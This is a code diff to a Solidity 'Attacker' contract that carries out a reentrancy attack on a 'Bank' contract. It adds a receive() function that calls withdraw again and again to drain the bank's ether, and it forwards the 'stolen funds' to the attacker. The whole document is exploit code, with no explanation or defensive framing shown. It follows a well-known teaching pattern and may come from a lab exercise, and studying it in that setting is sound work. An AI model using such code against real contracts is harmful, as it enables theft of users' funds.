@@ -10,7 +10,7 @@ contract Attacker {
         bank = Bank(_bank);
     }
 
-    function attack() public {
+    function attack() public payable {
         // Step 1: Deposit 1 ether to the bank
         bank.deposit{value: 1 ether}();
 
@@ -18,8 +18,17 @@ contract Attacker {
         bank.withdraw(1 ether);
 
         // Step 3: Send any remaining stolen funds to the attacker
-        msg.sender.call{value: address(this).balance}("");
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+
+        require(success, "Transfer to attacker failed");
         // At this point, the fallback function will be triggered
+    }
+
+    receive() external payable {
+        if (address(bank).balance >= 1 ether) {
+            // Re-enter the withdraw function to drain more funds
+            bank.withdraw(1 ether);
+        }
     }
 
     fallback() external payable {
@@ -28,5 +37,4 @@ contract Attacker {
             bank.withdraw(1 ether);
         }
     }
-    receive() external payable {}
 }
